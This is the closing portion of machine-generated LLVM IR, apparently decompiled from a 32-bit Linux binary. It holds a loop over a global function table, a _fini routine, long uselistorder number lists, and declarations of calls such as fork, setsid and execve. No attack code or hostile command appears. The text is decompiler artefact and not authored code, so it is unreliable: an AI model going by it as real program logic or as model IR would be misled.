  %v10_80571f1 = icmp eq i32 %v0_80571ec, -1
  br i1 %v10_80571f1, label %dec_label_pc_8057202, label %dec_label_pc_80571f6.preheader

dec_label_pc_80571f6.preheader:                   ; preds = %entry
  br label %dec_label_pc_80571f6

dec_label_pc_80571f6:                             ; preds = %dec_label_pc_80571f6.preheader, %dec_label_pc_80571f6
  %v4_80571f9 = phi i32 [ %v0_80571ec, %dec_label_pc_80571f6.preheader ], [ %v2_80571fb, %dec_label_pc_80571f6 ]
  %v0_80571f6 = phi i32 [ ptrtoint (i32* @global_var_805b000.530 to i32), %dec_label_pc_80571f6.preheader ], [ %v1_80571f6, %dec_label_pc_80571f6 ]
  %v1_80571f6 = add i32 %v0_80571f6, -4
  call void @__pseudo_call(i32 %v4_80571f9)
  %v1_80571fb = inttoptr i32 %v1_80571f6 to i32*
  %v2_80571fb = load i32, i32* %v1_80571fb, align 4
  %v10_80571fd = icmp eq i32 %v2_80571fb, -1
  %v1_8057200 = icmp eq i1 %v10_80571fd, false
  br i1 %v1_8057200, label %dec_label_pc_80571f6, label %dec_label_pc_8057202.loopexit

dec_label_pc_8057202.loopexit:                    ; preds = %dec_label_pc_80571f6
  %v2_8057202.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8057202

dec_label_pc_8057202:                             ; preds = %dec_label_pc_8057202.loopexit, %entry
  %v2_8057202 = phi i32 [ %v2_8057202.pre, %dec_label_pc_8057202.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8057202

; uselistorder directives
  uselistorder i32 %v0_80571ec, { 1, 0 }
  uselistorder i1 false, { 891, 473, 3, 0, 1, 5, 474, 476, 475, 4, 478, 477, 53, 7, 54, 487, 482, 486, 484, 485, 74, 479, 480, 483, 6, 488, 489, 490, 491, 134, 136, 137, 138, 139, 135, 140, 141, 142, 145, 143, 144, 492, 493, 498, 55, 494, 495, 497, 496, 499, 500, 505, 504, 501, 502, 503, 8, 9, 409, 410, 411, 75, 506, 507, 508, 509, 510, 511, 287, 288, 289, 512, 56, 513, 514, 290, 291, 292, 838, 57, 11, 517, 518, 519, 520, 522, 521, 10, 537, 538, 58, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 820, 821, 823, 822, 12, 412, 413, 414, 415, 293, 294, 295, 556, 557, 530, 531, 532, 296, 297, 298, 299, 300, 301, 302, 93, 303, 304, 305, 306, 307, 308, 309, 798, 799, 800, 801, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 892, 893, 70, 326, 76, 327, 328, 329, 839, 840, 841, 894, 908, 909, 910, 911, 912, 915, 77, 916, 917, 914, 907, 895, 112, 398, 399, 400, 401, 402, 403, 896, 897, 202, 203, 204, 205, 206, 207, 13, 404, 405, 71, 468, 14, 469, 470, 569, 146, 900, 901, 902, 903, 904, 905, 906, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 842, 147, 148, 149, 150, 151, 152, 153, 154, 155, 855, 856, 857, 858, 859, 860, 861, 862, 50, 864, 863, 868, 865, 866, 867, 15, 869, 870, 406, 407, 828, 558, 559, 561, 562, 913, 17, 795, 794, 16, 481, 330, 331, 332, 78, 807, 808, 809, 810, 812, 811, 18, 813, 333, 19, 560, 814, 815, 408, 334, 335, 535, 533, 534, 20, 59, 523, 528, 527, 79, 529, 525, 524, 80, 526, 156, 536, 157, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 355, 354, 21, 356, 357, 358, 359, 360, 362, 51, 363, 361, 364, 366, 365, 22, 367, 368, 370, 369, 81, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 131, 132, 898, 82, 899, 23, 539, 540, 541, 542, 543, 395, 515, 516, 158, 159, 160, 161, 162, 831, 184, 165, 94, 163, 164, 83, 84, 166, 167, 168, 169, 170, 171, 172, 173, 174, 24, 25, 175, 176, 177, 178, 179, 180, 181, 182, 72, 183, 52, 95, 96, 97, 98, 185, 188, 186, 187, 189, 190, 191, 192, 99, 193, 100, 194, 195, 197, 196, 27, 26, 198, 199, 200, 201, 208, 209, 210, 101, 211, 212, 213, 214, 215, 216, 219, 102, 217, 218, 34, 35, 220, 60, 221, 222, 223, 224, 225, 226, 227, 230, 103, 228, 229, 32, 33, 231, 232, 233, 234, 235, 236, 239, 104, 237, 238, 30, 31, 240, 91, 47, 61, 241, 242, 243, 90, 244, 245, 246, 247, 248, 249, 252, 105, 250, 251, 28, 29, 253, 48, 92, 62, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 106, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 396, 397, 416, 417, 418, 107, 439, 108, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 85, 86, 440, 441, 442, 443, 444, 445, 446, 447, 448, 49, 449, 109, 450, 451, 452, 110, 453, 454, 111, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 471, 472, 563, 564, 565, 566, 567, 37, 568, 36, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 63, 778, 779, 780, 781, 782, 73, 783, 784, 785, 786, 787, 788, 789, 790, 791, 796, 792, 793, 64, 797, 802, 89, 803, 65, 804, 66, 805, 806, 38, 818, 816, 817, 39, 819, 40, 824, 825, 826, 41, 827, 2, 829, 830, 832, 833, 834, 67, 835, 836, 837, 871, 887, 872, 873, 874, 875, 880, 884, 885, 886, 42, 876, 87, 877, 878, 879, 68, 46, 881, 45, 69, 44, 882, 883, 43, 888, 889, 890, 133, 88, 918 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 12, 29, 56, 57, 58, 59, 69, 70, 71, 72, 10, 73, 2, 68, 30, 60, 11, 61, 62, 63, 13, 74, 75, 76, 77, 78, 79, 14, 67, 65, 66, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 7, 5, 6, 8, 3, 64, 0, 42, 43, 44, 45, 9, 16, 46, 47, 48, 1, 49, 50, 51, 52, 53, 15, 4, 54, 55 }
  uselistorder i32 ptrtoint (i32* @global_var_805b000.530 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, {}
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_80571f6, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_805720b = load i32, i32* @ebx, align 4
  %v1_805720c = call i32 @__get_pc_thunk_bx(i32 %v0_805720b)
  store i32 %v1_805720c, i32* @eax, align 4
  %v0_8057217 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8057217

; uselistorder directives
  uselistorder i32* @eax, { 15, 2, 34, 112, 4, 113, 114, 3, 115, 0, 33, 1, 111, 116, 35, 117, 62, 63, 65, 16, 64, 118, 120, 119, 6, 7, 90, 91, 179, 121, 41, 126, 42, 127, 128, 129, 44, 130, 5, 46, 47, 146, 147, 48, 148, 49, 149, 150, 50, 51, 52, 151, 152, 153, 154, 53, 155, 156, 157, 158, 54, 139, 167, 181, 58, 182, 183, 185, 59, 186, 8, 184, 12, 14, 180, 109, 17, 66, 67, 160, 68, 168, 170, 171, 169, 69, 70, 172, 173, 175, 176, 174, 159, 55, 9, 10, 135, 136, 137, 43, 138, 131, 132, 133, 134, 71, 72, 140, 141, 73, 74, 92, 94, 93, 95, 96, 98, 61, 97, 142, 143, 45, 144, 145, 122, 36, 37, 123, 38, 124, 39, 40, 125, 56, 75, 76, 77, 78, 79, 57, 80, 18, 20, 19, 22, 21, 23, 81, 24, 25, 82, 83, 84, 85, 26, 86, 27, 87, 28, 88, 29, 89, 99, 100, 30, 101, 102, 103, 104, 105, 106, 107, 31, 108, 32, 60, 110, 161, 162, 163, 164, 165, 166, 187, 177, 178, 11, 13 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1284, 15, 16, 17, 67, 885, 1285, 1288, 1286, 1287, 886, 1105, 1106, 18, 69, 1291, 1299, 1293, 1294, 19, 58, 1295, 1296, 1297, 887, 1298, 68, 138, 139, 140, 1289, 1290, 148, 1300, 1301, 1303, 1304, 1302, 1305, 294, 1306, 1307, 1308, 1309, 1310, 1311, 149, 150, 888, 375, 376, 118, 1005, 889, 1006, 1007, 72, 73, 1008, 1009, 1010, 857, 1011, 71, 890, 70, 891, 151, 0, 1, 892, 152, 153, 893, 894, 895, 154, 896, 1314, 897, 1312, 279, 1313, 377, 378, 155, 2, 3, 898, 1315, 1316, 1317, 1318, 1319, 379, 899, 900, 156, 1320, 20, 74, 1248, 121, 122, 901, 1321, 75, 902, 21, 157, 1107, 380, 1322, 1323, 1324, 1108, 1109, 14, 295, 159, 158, 1110, 1111, 296, 1112, 1113, 160, 161, 903, 1325, 1326, 904, 1114, 905, 1115, 1116, 1117, 1118, 1327, 162, 906, 163, 381, 1330, 1331, 1332, 1333, 129, 22, 1334, 76, 1347, 1348, 1361, 1362, 1363, 1364, 1370, 1371, 1372, 1373, 1365, 1366, 1367, 1368, 1369, 77, 78, 907, 1374, 1375, 79, 80, 81, 908, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 164, 1455, 1456, 165, 1457, 1458, 1459, 82, 130, 297, 141, 909, 131, 1119, 166, 1120, 23, 132, 123, 1121, 266, 167, 1122, 124, 1123, 1335, 1336, 1343, 298, 1344, 910, 1124, 382, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 168, 911, 1133, 1134, 1135, 1136, 169, 1137, 912, 170, 261, 383, 171, 913, 914, 915, 299, 1138, 1436, 1437, 1438, 300, 289, 290, 1439, 1440, 1441, 1442, 1443, 1444, 916, 301, 1139, 172, 917, 1140, 173, 302, 303, 1141, 1142, 918, 1143, 1144, 1145, 1146, 114, 1530, 1531, 1532, 1533, 125, 267, 133, 1147, 268, 919, 920, 921, 1148, 174, 1149, 1467, 1482, 1483, 1484, 384, 1485, 1261, 1486, 1020, 1535, 1536, 1537, 1538, 1539, 1012, 1540, 1487, 1488, 1541, 175, 1542, 1553, 1554, 24, 147, 922, 25, 923, 924, 1564, 1568, 269, 1569, 176, 832, 385, 386, 4, 1543, 1544, 1545, 177, 178, 973, 856, 179, 925, 1228, 304, 305, 180, 1229, 1230, 181, 182, 1232, 1231, 1233, 1234, 387, 833, 1235, 1237, 1236, 1238, 1546, 1547, 183, 926, 1552, 1064, 1065, 1066, 1067, 927, 928, 1068, 364, 929, 306, 184, 185, 186, 388, 389, 126, 390, 1240, 1239, 391, 1247, 187, 188, 930, 1013, 931, 1014, 189, 932, 190, 933, 1275, 83, 1276, 1277, 1278, 5, 934, 1416, 392, 1015, 1016, 1017, 1018, 935, 191, 1555, 834, 192, 307, 1557, 1560, 1559, 1491, 1492, 1493, 1494, 1495, 308, 1496, 1497, 1498, 393, 1489, 394, 1490, 395, 936, 1021, 142, 1022, 309, 937, 1023, 938, 939, 396, 835, 940, 397, 836, 193, 941, 1499, 1500, 194, 195, 398, 837, 144, 1501, 1502, 1503, 196, 197, 399, 838, 143, 1504, 270, 1505, 127, 1506, 1507, 1509, 942, 1508, 6, 1019, 7, 1558, 1241, 1242, 1243, 1244, 1246, 1245, 8, 310, 1468, 1469, 1470, 1394, 943, 311, 1395, 944, 1396, 1397, 1398, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1460, 1445, 198, 199, 945, 946, 312, 1565, 1567, 26, 1292, 200, 201, 1150, 1151, 145, 1152, 202, 947, 1153, 271, 134, 1154, 84, 1399, 60, 9, 948, 313, 314, 203, 1155, 1156, 1157, 204, 1345, 85, 949, 1337, 950, 1342, 1341, 272, 951, 952, 1338, 1340, 1339, 273, 953, 1024, 1346, 1025, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 205, 954, 1167, 315, 1168, 1169, 1170, 1171, 1172, 27, 28, 955, 291, 292, 1173, 1174, 1175, 1176, 29, 1177, 1178, 1179, 30, 956, 1180, 31, 32, 206, 957, 1181, 1182, 1183, 1186, 1184, 1185, 33, 61, 86, 1187, 1188, 1189, 1190, 365, 1191, 1192, 207, 1193, 208, 1194, 958, 274, 1195, 209, 1196, 959, 1197, 1198, 1200, 1201, 1202, 1203, 1204, 1205, 210, 960, 961, 211, 1206, 1207, 962, 1208, 1209, 1210, 1211, 1212, 963, 1213, 1214, 316, 964, 317, 1215, 1216, 1217, 1218, 1219, 1220, 34, 87, 88, 89, 965, 1221, 212, 966, 1222, 839, 1223, 1224, 213, 967, 128, 59, 115, 1199, 275, 1548, 1549, 276, 1551, 1550, 90, 400, 968, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 318, 1359, 969, 970, 1360, 319, 1225, 214, 1328, 971, 1329, 1534, 215, 1279, 1556, 1026, 1446, 1466, 1027, 1473, 1561, 146, 320, 1528, 1566, 1474, 1529, 1028, 1475, 216, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1424, 1476, 1477, 1038, 1562, 1563, 858, 262, 1039, 263, 1040, 1042, 1041, 1043, 1044, 859, 404, 405, 324, 325, 323, 1045, 35, 217, 218, 321, 401, 219, 860, 1046, 220, 322, 1047, 1048, 91, 135, 403, 223, 221, 222, 402, 1049, 1050, 1051, 1052, 1054, 280, 1053, 861, 1055, 1056, 224, 225, 226, 326, 227, 343, 93, 1058, 406, 1057, 408, 409, 92, 407, 410, 411, 228, 1059, 327, 1060, 366, 1061, 1062, 1063, 328, 136, 421, 863, 427, 428, 329, 1070, 281, 282, 862, 1069, 864, 429, 430, 418, 840, 1071, 1073, 419, 841, 420, 842, 1072, 97, 1074, 865, 431, 432, 415, 1075, 1077, 416, 417, 1076, 96, 1078, 866, 433, 434, 412, 1079, 1081, 413, 414, 1080, 95, 1082, 367, 1083, 1084, 1085, 1086, 867, 435, 436, 422, 843, 1087, 1089, 423, 844, 424, 845, 1088, 94, 1090, 119, 120, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 868, 437, 438, 869, 439, 440, 425, 846, 1100, 870, 441, 442, 426, 847, 1101, 1102, 871, 443, 444, 1103, 1104, 872, 445, 446, 873, 447, 448, 874, 449, 450, 875, 471, 472, 36, 1226, 1227, 37, 62, 98, 1249, 344, 1250, 38, 345, 1251, 264, 1252, 876, 451, 452, 877, 453, 454, 878, 455, 456, 879, 457, 458, 880, 459, 460, 265, 881, 461, 462, 1253, 368, 1254, 1255, 1256, 1257, 330, 1258, 848, 1259, 1260, 137, 1262, 1263, 288, 286, 39, 287, 1264, 369, 1265, 1266, 1267, 1268, 10, 1269, 331, 1270, 229, 285, 283, 40, 284, 1271, 1272, 1273, 1274, 293, 464, 230, 463, 849, 850, 231, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 851, 998, 999, 852, 349, 1000, 346, 347, 348, 1001, 1002, 853, 466, 1003, 1280, 1281, 41, 101, 1282, 42, 43, 465, 1283, 99, 63, 100, 332, 854, 11, 232, 233, 234, 1408, 467, 1409, 1410, 1411, 333, 1412, 106, 1413, 1414, 1415, 64, 102, 103, 104, 105, 1417, 235, 236, 237, 238, 1418, 1420, 1421, 1422, 239, 1423, 240, 241, 242, 350, 1419, 370, 468, 469, 334, 351, 335, 12, 336, 882, 470, 1425, 243, 244, 245, 246, 337, 1426, 247, 248, 352, 1427, 1428, 249, 44, 45, 1433, 107, 65, 1434, 353, 1429, 1430, 338, 250, 1431, 1432, 371, 251, 252, 253, 354, 855, 1435, 1447, 1448, 1449, 883, 355, 254, 255, 357, 1450, 256, 356, 1451, 108, 46, 66, 47, 1452, 339, 109, 110, 473, 117, 1454, 340, 1453, 475, 476, 111, 474, 477, 478, 1461, 1462, 372, 1463, 1464, 48, 1465, 49, 373, 112, 884, 1471, 257, 258, 479, 1472, 259, 341, 1478, 1479, 1480, 1481, 342, 50, 1510, 1511, 1512, 480, 481, 1522, 51, 52, 116, 53, 360, 361, 1513, 1514, 1515, 1516, 277, 358, 359, 362, 1517, 1518, 1519, 1520, 54, 55, 113, 1521, 374, 56, 57, 1523, 1524, 363, 972, 13, 1525, 1526, 1527, 260, 1004, 278, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577 }
  uselistorder i32* @ebx, { 75, 163, 164, 324, 326, 329, 330, 331, 332, 333, 327, 325, 328, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 354, 355, 0, 356, 357, 358, 359, 360, 361, 362, 363, 364, 287, 288, 165, 166, 167, 365, 3, 366, 367, 368, 4, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 168, 169, 170, 171, 380, 381, 725, 726, 6, 389, 387, 388, 390, 393, 391, 392, 394, 395, 396, 5, 425, 397, 1, 440, 441, 442, 443, 444, 445, 7, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 398, 399, 400, 401, 8, 410, 9, 411, 412, 172, 173, 174, 175, 10, 176, 177, 178, 11, 179, 12, 180, 181, 182, 183, 13, 184, 185, 186, 187, 188, 189, 190, 789, 790, 14, 791, 792, 795, 796, 191, 192, 713, 714, 715, 727, 15, 728, 729, 303, 304, 730, 731, 102, 103, 104, 797, 798, 799, 800, 801, 802, 803, 88, 804, 732, 733, 734, 735, 736, 805, 806, 807, 33, 34, 820, 821, 822, 839, 840, 841, 842, 30, 16, 28, 823, 833, 837, 838, 808, 268, 269, 270, 271, 272, 273, 274, 275, 809, 810, 811, 812, 819, 153, 154, 276, 277, 278, 279, 280, 281, 282, 286, 89, 90, 91, 92, 93, 94, 312, 313, 17, 2, 314, 471, 472, 96, 315, 316, 317, 95, 97, 473, 474, 475, 829, 830, 98, 99, 100, 101, 737, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 18, 752, 753, 738, 739, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 19, 116, 117, 118, 119, 120, 121, 122, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 31, 765, 766, 767, 768, 769, 20, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 827, 828, 283, 284, 285, 460, 461, 462, 463, 464, 465, 21, 466, 467, 468, 694, 695, 696, 697, 698, 843, 844, 845, 846, 847, 848, 849, 853, 854, 692, 693, 193, 194, 705, 706, 195, 196, 197, 198, 199, 200, 201, 202, 413, 414, 415, 416, 417, 418, 419, 420, 402, 405, 406, 407, 408, 409, 403, 404, 123, 124, 125, 126, 421, 422, 423, 424, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 239, 240, 22, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 23, 254, 255, 256, 257, 258, 71, 72, 73, 74, 234, 236, 235, 237, 238, 813, 24, 814, 815, 816, 817, 32, 25, 29, 818, 855, 856, 857, 858, 859, 426, 427, 428, 429, 430, 431, 26, 432, 27, 433, 434, 435, 436, 437, 438, 439, 259, 260, 261, 262, 263, 264, 382, 383, 384, 385, 386, 793, 794, 318, 319, 825, 826, 127, 128, 699, 700, 711, 712, 129, 130, 131, 716, 717, 831, 832, 784, 785, 786, 850, 851, 852, 718, 719, 787, 788, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 687, 688, 720, 721, 722, 723, 724, 142, 143, 144, 824, 834, 835, 836, 145, 146, 147, 148, 149, 150, 151, 152, 155, 156, 157, 158, 159, 160, 161, 162, 265, 266, 267, 299, 300, 301, 302, 305, 306, 307, 308, 309, 310, 311, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 320, 321, 322, 323, 469, 470, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 689, 690, 691, 701, 702, 703, 704, 707, 708, 709, 710, 780, 781, 782, 783 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
